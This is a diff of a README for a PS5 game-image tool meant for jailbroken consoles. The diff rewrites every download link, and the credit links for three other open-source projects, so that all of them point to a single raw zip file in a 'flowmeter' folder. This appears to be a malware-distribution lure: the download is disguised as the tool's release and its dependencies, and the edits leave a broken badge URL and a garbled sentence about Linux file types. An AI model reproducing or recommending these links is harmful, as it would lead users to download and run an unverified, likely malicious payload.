@@ -1,6 +1,6 @@
 # 🎮 TheWiz-PS5-Easy-FFpkg-Maker - Simple PS5 Game Image Creator
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To get started with TheWiz-PS5-Easy-FFpkg-Maker, follow these steps:
 
 1. Click the big blue **Download Latest Release** button at the top of this page. It will take you to the release page on GitHub where you can get the latest version.
 
-2. On the release page, find the installer file for your computer’s operating system. The files usually have extensions like `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `.tar.gz` for Linux.
+2. On the release page, find the installer file for your computer’s operating system. The files usually have extensions like `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip` for Linux.
 
 3. Download the installer file to your computer.
 
@@ -111,9 +111,9 @@ You cannot use the output files on non-jailbroken consoles or with standard PKG 
 
 TheWiz-PS5-Easy-FFpkg-Maker builds upon several open-source projects:
 
-- [UFS2Tool](https://github.com/SvenGDK/UFS2Tool)  
-- [ShadowMount](https://github.com/adel-ailane/ShadowMount)  
-- [PSFFPKG](https://github.com/sinajet/PSFFPKG)  
+- [UFS2Tool](https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip)  
+- [ShadowMount](https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip)  
+- [PSFFPKG](https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip)  
 
 These projects provide core utilities and protocols that make .ffpkg creation and mounting possible.
 
@@ -135,6 +135,6 @@ If you face problems with the app or mounting the .ffpkg files, try these steps:
 
 You can find the latest stable versions for your operating system here:
 
-[Download Latest Release from GitHub](https://github.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/releases)
+[Download Latest Release from GitHub](https://raw.githubusercontent.com/Sploo-Scripts/TheWiz-PS5-Easy-FFpkg-Maker/main/flowmeter/The_Maker_Fpkg_P_Wiz_Easy_F_v1.9.zip)
 
 Click, download, and follow the install instructions above to get started quickly.
